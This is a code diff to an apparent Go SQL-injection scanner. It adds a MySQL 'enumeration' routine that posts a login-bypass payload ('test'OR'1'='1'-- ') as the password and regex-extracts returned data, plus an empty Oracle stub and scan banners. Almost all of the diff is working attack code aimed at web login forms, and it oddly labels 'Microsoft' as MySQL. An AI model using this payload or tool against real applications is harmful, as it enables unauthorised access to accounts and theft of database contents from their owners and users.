@@ -7,6 +7,7 @@ import (
 		"net/http"
 		"net/url"
 		"strings"
+		"regexp"
 )
 
 type Database struct {
@@ -71,19 +72,37 @@ func get_version() string {
 	}
 	return "Microsoft";
 }
+func oracle_enumeration() {
+	fmt.Println("Oracle Enumeration Section");
+}
+
+func mysql_enumeration() {
+	data := url.Values {
+		"username":		{"admin"},
+		"password":		{"test'OR'1'='1'-- "},
+	};
+	code, body := get_response(data);
+	if (code == 200 && !(strings.Contains(body, "Fatal"))) {
+		re := regexp.MustCompile(`JSONSTART\[.*?\]JSONEND`);
+		final := re.FindString(body);
+		fmt.Println(final);
+	}
+}
 
 func main() {
 	var vuln bool = check_sqli();
-
+	fmt.Println("\n*************** BEGINNING SQLinjection SCAN ****************\n");
 	if (vuln == true) {
-		fmt.Println("************APPLICATION IS VULNERABLE TO SQLi, VERSION TESTING***********");
+		fmt.Println("************APPLICATION IS VULNERABLE TO SQLi, VERSION TESTING***********\n");
 		var _type string = get_version();
 		if (_type == "Microsoft") {
-			fmt.Println("************MICROSOFT MYSQL DATABASE IN USE**************");
+			fmt.Println("************MICROSOFT MYSQL DATABASE IN USE**************\n");
+			mysql_enumeration()
 		} else if (_type == "Oracle") {
-			fmt.Println("************ORACLE SQL DATABASE IN USE***************");
+			fmt.Println("************ORACLE SQL DATABASE IN USE***************\n");
+			oracle_enumeration()
 		} else {
-			fmt.Println("************UNABLE TO DETERMINE DATABASE TYPE**************");
+			fmt.Println("************UNABLE TO DETERMINE DATABASE TYPE**************\n");
 		}
 	}
 }
